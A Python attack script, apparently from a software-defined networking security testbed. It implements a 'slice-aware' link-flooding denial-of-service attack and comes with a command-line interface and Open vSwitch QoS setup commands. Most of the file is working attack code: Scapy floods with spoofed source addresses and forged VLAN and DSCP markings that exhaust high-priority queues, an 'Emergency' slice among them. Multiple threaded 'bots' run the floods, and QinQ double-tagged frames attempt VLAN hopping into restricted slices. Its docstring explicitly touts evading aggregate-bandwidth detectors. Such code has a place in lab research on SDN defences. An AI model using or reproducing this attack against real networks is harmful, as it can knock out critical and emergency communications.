#!/usr/bin/env python3
"""
=============================================================================
ATTACK D: Slice-Aware LFA
=============================================================================
Targets specific network slices (QoS queues / VLANs) in an SDN environment.

In modern SDNs, network slicing isolates traffic into logical segments:
  - Slice 0 (VLAN 10): Emergency/Control traffic (highest priority)
  - Slice 1 (VLAN 20): Voice/Video traffic (high priority)
  - Slice 2 (VLAN 30): Enterprise data (medium priority)
  - Slice 3 (VLAN 40): Best-effort Internet (low priority)

Attack strategy:
  1. Identify high-priority slice (VLAN tag, DSCP marking)
  2. Inject traffic that matches high-priority queue selectors
  3. Saturate the HIGH-priority slice specifically
  4. Normal best-effort traffic is unaffected → harder to detect
  5. Critical services (e.g., emergency comm) experience denial-of-service

Why this is advanced:
  - Traditional LFA detectors look at aggregate link utilization
  - Slice-aware LFA keeps total bandwidth moderate but exhausts specific queues
  - Exploits QoS misconfiguration and priority inheritance

Usage:
    python3 attacks/slice_aware_lfa.py \
        --target 10.2.0.2 \
        --slice 1 \
        --vlan 20 \
        --dscp 46 \
        --duration 90
=============================================================================
"""

import time
import random
import socket
import struct
import threading
import argparse
import logging
import sys

try:
    from scapy.all import (Ether, Dot1Q, IP, TCP, UDP, ICMP, sendp,
                            get_if_list, conf)
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [SLICE-AWARE] %(message)s'
)
LOG = logging.getLogger('SliceAwareLFA')

# Network slice definitions (match your Ryu QoS config)
SLICES = {
    0: {'name': 'Emergency', 'vlan': 10,  'dscp': 46, 'priority': 7,
        'queue_id': 0, 'max_bw_mbps': 100},
    1: {'name': 'VoIP',      'vlan': 20,  'dscp': 46, 'priority': 6,
        'queue_id': 1, 'max_bw_mbps': 50},
    2: {'name': 'Enterprise','vlan': 30,  'dscp': 26, 'priority': 4,
        'queue_id': 2, 'max_bw_mbps': 200},
    3: {'name': 'BestEffort','vlan': 40,  'dscp': 0,  'priority': 0,
        'queue_id': 3, 'max_bw_mbps': 500},
}


class QoSSliceExhaustion:
    """
    Exhausts a specific QoS queue by injecting traffic with the
    correct VLAN tag and DSCP marking that maps to the target slice.
    """

    def __init__(self, interface: str, target_ip: str,
                 target_slice: int, duration: int, rate_pps: int):
        self.interface    = interface
        self.target_ip    = target_ip
        self.slice_cfg    = SLICES[target_slice]
        self.duration     = duration
        self.rate_pps     = rate_pps
        self.running      = False
        self.packets_sent = 0

    def _craft_slice_packet(self) -> bytes:
        """Craft a packet that matches the target slice selector."""
        if not SCAPY_AVAILABLE:
            return b'\x00' * 64

        # Build IP with correct DSCP value
        tos  = self.slice_cfg['dscp'] << 2   # DSCP in 6 upper bits of ToS
        ip   = IP(
            src=f'192.168.{random.randint(1,254)}.{random.randint(1,254)}',
            dst=self.target_ip,
            tos=tos,
            ttl=64
        )

        # Add VLAN tag (802.1Q)
        vlan = Dot1Q(
            vlan=self.slice_cfg['vlan'],
            prio=self.slice_cfg['priority']   # 802.1p priority
        )

        # Payload: varies by slice type
        if self.slice_cfg['name'] == 'VoIP':
            # VoIP-like: small UDP packets (RTP)
            transport = UDP(
                sport=random.randint(16384, 32767),  # RTP port range
                dport=random.randint(16384, 32767)
            )
            payload = b'\x80\x00' + struct.pack('>H', random.randint(0, 65535))  # RTP header
            payload += random.randbytes(160)   # G.711 PCM = 160 bytes/pkt
        elif self.slice_cfg['name'] == 'Emergency':
            # Emergency: small control packets
            transport = TCP(
                sport=random.randint(1024, 65535),
                dport=443,
                flags='PA'   # Push+ACK
            )
            payload = b'EMERGENCY_CTRL:' + random.randbytes(32)
        else:
            transport = UDP(
                sport=random.randint(1024, 65535),
                dport=random.randint(1024, 65535)
            )
            payload = random.randbytes(random.randint(64, 512))

        pkt = Ether() / vlan / ip / transport / payload
        return pkt

    def run_scapy(self):
        """Flood the slice using Scapy (requires root + network interface)."""
        LOG.info('Slice exhaustion (Scapy) → slice=%s vlan=%d dscp=%d pps=%d',
                 self.slice_cfg['name'], self.slice_cfg['vlan'],
                 self.slice_cfg['dscp'], self.rate_pps)

        self.running = True
        start    = time.time()
        interval = 1.0 / self.rate_pps

        while self.running and (time.time() - start) < self.duration:
            pkt = self._craft_slice_packet()
            try:
                sendp(pkt, iface=self.interface, verbose=False)
                self.packets_sent += 1
                time.sleep(interval)
            except Exception as e:
                LOG.debug('Send error: %s', e)
                time.sleep(0.01)

        LOG.info('Slice exhaustion done: %d packets', self.packets_sent)

    def run_socket(self):
        """
        Fallback: Raw socket flood with DSCP marking (no VLAN tag).
        Works without Scapy but requires root for raw sockets.
        """
        LOG.info('Slice exhaustion (raw socket) → dscp=%d pps=%d',
                 self.slice_cfg['dscp'], self.rate_pps)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Set DSCP via IP_TOS socket option (DSCP shifted left 2 bits)
            tos = self.slice_cfg['dscp'] << 2
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, tos)
        except (PermissionError, AttributeError):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            LOG.warning('Could not set IP_TOS (needs root). Sending without DSCP.')

        self.running = True
        start    = time.time()
        interval = 1.0 / self.rate_pps

        while self.running and (time.time() - start) < self.duration:
            payload = random.randbytes(random.choice([64, 128, 160, 256]))
            try:
                sock.sendto(payload, (self.target_ip,
                                      random.randint(16384, 32767)))
                self.packets_sent += 1
            except socket.error:
                pass
            time.sleep(interval)

        sock.close()
        LOG.info('Socket flood done: %d packets', self.packets_sent)

    def run(self):
        if SCAPY_AVAILABLE:
            self.run_scapy()
        else:
            self.run_socket()

    def stop(self):
        self.running = False


class VLANHopping:
    """
    VLAN hopping attack: inject double-tagged (QinQ) frames to access
    restricted slices from a lower-priority slice.
    """

    def __init__(self, interface: str, outer_vlan: int, inner_vlan: int,
                 target_ip: str, duration: int):
        self.interface  = interface
        self.outer_vlan = outer_vlan
        self.inner_vlan = inner_vlan
        self.target_ip  = target_ip
        self.duration   = duration

    def run(self):
        if not SCAPY_AVAILABLE:
            LOG.info('(Simulated) VLAN hopping: outer=%d inner=%d → %s',
                     self.outer_vlan, self.inner_vlan, self.target_ip)
            time.sleep(min(self.duration, 5))
            return

        LOG.info('VLAN hopping: outer=%d inner=%d → %s for %ds',
                 self.outer_vlan, self.inner_vlan, self.target_ip, self.duration)
        start = time.time()
        sent  = 0

        while time.time() - start < self.duration:
            # Double-tagged frame (QinQ / 802.1ad)
            pkt = (
                Ether() /
                Dot1Q(vlan=self.outer_vlan, type=0x8100) /  # outer tag
                Dot1Q(vlan=self.inner_vlan) /                 # inner tag
                IP(dst=self.target_ip, ttl=64) /
                UDP(dport=random.randint(1024, 65535)) /
                random.randbytes(64)
            )
            try:
                sendp(pkt, iface=self.interface, verbose=False)
                sent += 1
            except Exception:
                pass
            time.sleep(0.001)   # 1000 pps

        LOG.info('VLAN hopping done: %d frames', sent)


class SliceAwareLFA:
    """
    Orchestrates slice-aware LFA: exhausts the target slice
    while optionally using VLAN hopping to reach restricted slices.
    """

    def __init__(self, interface: str, target_ip: str,
                 target_slice: int, duration: int, num_bots: int = 4):
        self.interface    = interface
        self.target_ip    = target_ip
        self.target_slice = target_slice
        self.duration     = duration
        self.num_bots     = num_bots

    def run(self):
        slice_info = SLICES[self.target_slice]
        LOG.info('╔══════════════════════════════════════════╗')
        LOG.info('║   Slice-Aware LFA Attack                 ║')
        LOG.info('╚══════════════════════════════════════════╝')
        LOG.info('  Target slice : %s (VLAN %d, DSCP %d)',
                 slice_info['name'], slice_info['vlan'], slice_info['dscp'])
        LOG.info('  Target IP    : %s', self.target_ip)
        LOG.info('  Bots         : %d', self.num_bots)
        LOG.info('  Duration     : %ds', self.duration)

        threads = []

        # Launch multiple bots each exhausting the target slice
        for i in range(self.num_bots):
            rate = random.randint(800, 1500)   # varied rate per bot
            bot  = QoSSliceExhaustion(
                interface   = self.interface,
                target_ip   = self.target_ip,
                target_slice= self.target_slice,
                duration    = self.duration,
                rate_pps    = rate
            )
            t = threading.Thread(target=bot.run, daemon=True)
            threads.append(t)
            t.start()
            time.sleep(0.2)

        # Also launch VLAN hopping to demonstrate cross-slice impact
        if self.target_slice > 0:
            hopper = VLANHopping(
                interface  = self.interface,
                outer_vlan = SLICES[self.target_slice]['vlan'],
                inner_vlan = SLICES[0]['vlan'],   # try to reach highest slice
                target_ip  = self.target_ip,
                duration   = self.duration
            )
            t = threading.Thread(target=hopper.run, daemon=True)
            threads.append(t)
            t.start()

        LOG.info('All slice-aware components running...')
        for t in threads:
            t.join(timeout=self.duration + 10)

        LOG.info('Slice-Aware LFA complete.')


# =============================================================================
# OVS QoS Setup Commands (for topology preparation)
# =============================================================================
OVS_QOS_COMMANDS = """
╔══════════════════════════════════════════════════════════════════╗
║  OVS QoS Configuration (run before Slice-Aware attack test)     ║
╚══════════════════════════════════════════════════════════════════╝

# Create 4 QoS queues on the bottleneck link (s1-eth1):

# Step 1: Create QoS policy with 4 queues (total 10 Mbps bottleneck)
sudo ovs-vsctl set port s1-eth1 qos=@qos1 -- \\
    --id=@qos1 create qos type=linux-htb \\
    queues:0=@q0 queues:1=@q1 queues:2=@q2 queues:3=@q3 -- \\
    --id=@q0 create queue other-config:min-rate=2000000 other-config:max-rate=10000000 -- \\
    --id=@q1 create queue other-config:min-rate=1500000 other-config:max-rate=5000000 -- \\
    --id=@q2 create queue other-config:min-rate=3000000 other-config:max-rate=8000000 -- \\
    --id=@q3 create queue other-config:min-rate=1000000 other-config:max-rate=10000000

# Step 2: Add OpenFlow rules to steer traffic to queues by DSCP
# (Run from Ryu controller or manually via ovs-ofctl)
sudo ovs-ofctl -O OpenFlow13 add-flow s1 \\
    "priority=100,ip,nw_tos=184,actions=set_queue:0,output:2"  # DSCP 46 → queue 0
sudo ovs-ofctl -O OpenFlow13 add-flow s1 \\
    "priority=90,ip,nw_tos=104,actions=set_queue:1,output:2"   # DSCP 26 → queue 1
sudo ovs-ofctl -O OpenFlow13 add-flow s1 \\
    "priority=80,ip,nw_tos=0,actions=set_queue:3,output:2"     # BE → queue 3

# Step 3: Verify QoS
sudo ovs-vsctl list qos
sudo ovs-appctl qos/show s1
"""


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Slice-Aware LFA')
    parser.add_argument('--interface', default='eth0',     help='Network interface')
    parser.add_argument('--target',    default='10.2.0.2', help='Target IP')
    parser.add_argument('--slice',     type=int, default=1,
                        choices=[0, 1, 2, 3], help='Target slice (0=Emergency)')
    parser.add_argument('--duration',  type=int, default=90, help='Duration (s)')
    parser.add_argument('--bots',      type=int, default=4,  help='Number of bots')
    parser.add_argument('--show-ovs',  action='store_true',  help='Print OVS setup cmds')
    args = parser.parse_args()

    if args.show_ovs:
        print(OVS_QOS_COMMANDS)
        sys.exit(0)

    attack = SliceAwareLFA(
        interface   = args.interface,
        target_ip   = args.target,
        target_slice= args.slice,
        duration    = args.duration,
        num_bots    = args.bots
    )
    attack.run()
